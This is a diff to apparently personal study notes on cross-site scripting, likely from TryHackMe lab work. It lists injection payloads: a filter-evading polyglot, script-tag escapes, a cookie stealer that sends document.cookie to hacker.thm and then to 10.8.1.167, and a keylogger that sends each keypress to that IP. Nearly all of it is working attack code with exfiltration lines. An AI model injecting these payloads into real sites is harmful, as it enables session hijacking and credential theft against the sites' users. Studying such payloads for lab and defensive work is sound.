@@ -34,14 +34,15 @@ Check if variables are passed to unsafe methods such as `eval()`
 ##### Payloads
 To bypass `alert` blocks, use `prompt` or `confirm`
 ```C++
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )
+//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
 // Polyglot, escapes a lot.
 
 <script>alert('XSS');</script> // Proof of concept, sometimes blocked
 "><script>alert('XSS');</script> // Escape HTML
-</script><script>alert('XSS');</script> // Escape javascript functions
+</script><script>alert(document.cookie);</script> // Escape javascript functions
 
-<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script> // Steal cookies such as PHPSESSID in base64, sent to hacker.thm 
-<script>document.onkeypress = function(e) { fetch('https://10.8.1.167/log?key=' + btoa(e.key) );}</script> // Log keys, keys sent to hacker.thm
+<script>fetch('http://10.8.1.167/steal?cookie=' + btoa(document.cookie));</script> // Steal cookies such as PHPSESSID in base64, sent to a malicious IP
+<script>document.onkeypress = function(e) { fetch('http://10.8.1.167/log?key=' + btoa(e.key) );}</script> // Log keys, keys sent to hacker.thm
 
 ```
